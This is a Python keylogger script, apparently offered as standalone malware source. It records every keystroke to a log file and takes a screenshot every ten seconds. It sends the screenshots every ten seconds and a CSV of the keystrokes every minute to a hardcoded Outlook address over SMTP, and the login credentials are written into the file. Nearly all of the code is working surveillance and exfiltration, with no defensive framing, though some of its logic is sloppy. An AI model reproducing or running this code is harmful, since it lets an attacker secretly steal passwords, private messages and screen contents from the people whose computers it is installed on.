# libraries for keystrokes to be logged
from pkg_resources import working_set
import pynput
from pynput.keyboard import Key, Listener

# libraries for email to be sent
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# libraries for screenshot to be taken 
from multiprocessing import Process, freeze_support
from PIL import Image, ImageGrab
import time 
import os 
from datetime import datetime
import pandas as pd
from threading import Timer



# initializing variables used in further parts


keys_information = 'log.txt'
file_path = "conversion"
extend = "\\"
email_address = "keyloggingpro@outlook.com" # Enter disposable email here
password = "keys123@@@" # Enter email password here
toaddr = "keyloggingpro@outlook.com"
now = datetime.now() # current date and time
date_time = now.strftime("%Y-%m-%d-%H-%M-%S")
file_merge = file_path + extend

time_iteration = 15

currentTime = time.time()
stoppingTime = time.time() + time_iteration

# function to take screenshot
def screenshot():
    im = ImageGrab.grab()
    t = str(time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime(time.time())))
    im.save( t + ".png")
    return t
    
# function to send email     

def send_email(filename, attachment, toaddr):    
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Key Logger"
    body = "Keylogging data"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

# infinite loop for running program
# function to record keystrokes on press

while True:

    count = 0 
    keys = []

    def on_press(key):
        global keys, count,currentTime

        keys.append(key)
        count += 1
        currentTime = time.time()


        if count >= 1:
            count = 0 
            write_file(keys)
            keys = []
# function to write the recorded key strokes to a file and also special characters
    def write_file(keys):
        with open(r'log.txt', "a") as f:
            for key in keys:
                k = str(key).replace("'","")

                if k == "Key.space" :
                    f.write(' ')
                    f.close()

                if k == "Key.backspace" :
                    f.write(k.replace("Key.backspace","[backspace]"))
                    f.close()

                if k == "Key.caps_lock" :
                    f.write(k.replace("Key.caps_lock","[CAPS]"))
                    f.close()

                if k.find("enter") > 0:
                    f.write("[enter]")
                    f.close()
                
                if k == 'Keys.esc':
                    f.write('[esc]')
                    f.close()
                
                if k.find("ctrl") > 0:
                    f.write('[ctrl]')
                    f.close()                

                elif k.find("Key") == -1:
                    f.write(k);
                    f.close()
            
# function to send the screenshot via email
    def send_screenshot():
         t = screenshot()
         send_email(t + ".png", t + ".png", toaddr)
         os.remove(t + ".png")
         Timer(10.0, send_screenshot).start()
# function to send the csv file via email
    def send_csv():
        send_email('log.csv', 'log.csv', toaddr)
        Timer(60.0, send_csv).start()
        
# function to stop the logging of the keys
    def on_release(key):
        if currentTime > stoppingTime:
            return False
            
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open('log.txt', "a") as f:
            content = ","+ str(time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime(currentTime)))
            f.write(content)
            f.close()
        dataframe1 = pd.read_csv("log.txt")
        dataframe1.to_csv('log.csv', index = None)       
        with open( 'log.txt', "a") as f:
            f.write("\n")
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration
# Threads for the screenshots and csv to be send via email         
    Timer(10.0, send_screenshot).start()
    Timer(60.0, send_csv).start()        
